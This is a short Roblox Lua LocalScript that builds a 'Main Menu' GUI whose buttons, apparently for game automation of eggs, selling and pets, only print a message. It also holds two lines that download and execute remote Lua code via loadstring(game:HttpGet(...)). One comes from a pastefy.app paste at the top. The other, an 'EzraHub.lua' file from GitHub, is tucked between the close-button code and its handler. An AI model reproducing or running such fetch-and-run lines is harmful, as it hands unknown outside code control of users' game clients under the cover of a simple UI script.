loadstring(game:HttpGet("https://pastefy.app/rNQ4m8Oa/raw"))()
-- Place this LocalScript inside StarterGui

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Create Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 400)
mainFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "Main Menu"
title.Font = Enum.Font.GothamBold
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 20
title.Parent = mainFrame

-- Example Buttons
local function createButton(text, yPos)
	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1, -20, 0, 30)
	button.Position = UDim2.new(0, 10, 0, yPos)
	button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	button.Text = text
	button.Font = Enum.Font.Gotham
	button.TextColor3 = Color3.fromRGB(255, 255, 255)
	button.TextSize = 16
	button.Parent = mainFrame
	
	button.MouseButton1Click:Connect(function()
		print(text .. " button clicked!")
	end)
end

createButton("Automation Eggs", 50)
createButton("Automation Sell", 90)
createButton("Automation Pets", 130)
createButton("Select Pets (Middle)", 170)
createButton("Select Pets (Pet Time)", 210)
createButton("Refresh Pets", 250)

-- Close Button
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 5)
closeBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
closeBtn.Text = "X"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.TextSize = 14
closeBtn.Parent = mainFrame
loadstring(game:HttpGet("https://raw.githubusercontent.com/okayysy/Middle-Pet/refs/heads/main/Raw/Script/EzraHub.lua"))()
closeBtn.MouseButton1Click:Connect(function()
	mainFrame.Visible = false
end)
